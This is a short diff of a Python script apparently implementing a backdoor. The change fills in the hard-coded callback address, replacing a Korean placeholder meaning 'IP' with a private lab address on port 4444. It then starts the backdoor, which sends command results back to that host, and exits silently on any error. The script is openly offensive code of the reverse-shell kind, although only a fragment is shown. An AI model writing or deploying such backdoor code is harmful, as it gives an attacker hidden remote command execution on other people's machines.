@@ -104,7 +104,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 try:
-    my_backdoor = Backdoor("아이피", 4444)
+    my_backdoor = Backdoor("192.168.174.136", 4444)
     my_backdoor.run()
 except Exception:
     sys.exit()
